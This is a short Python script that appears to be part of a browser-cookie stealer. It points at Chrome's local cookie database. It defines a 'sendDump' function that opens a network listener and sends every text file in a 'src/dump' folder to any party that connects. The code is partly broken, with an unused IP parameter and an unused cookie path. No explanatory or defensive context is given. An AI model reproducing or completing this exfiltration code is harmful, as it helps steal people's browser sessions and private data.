import os
import time
import importlib
import socket

cookie_dir="%LocalAppData%\Google\Chrome\User Data\Default\cookies"

def sendDump(ip, port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind(('', port))
    s.listen(1)
    c, addr = s.accept()
    print("CONNECTION FROM:", str(addr))

    def send_txt_file(conn, filename):
        with open(filename, 'r') as f:
            contents = f.read()
            conn.send(contents.encode())

    for root, dirs, files in os.walk("src/dump"):
        for file in files:
            if file.endswith(".txt"):
                send_txt_file(c, os.path.join(root, file))

    c.close()
	
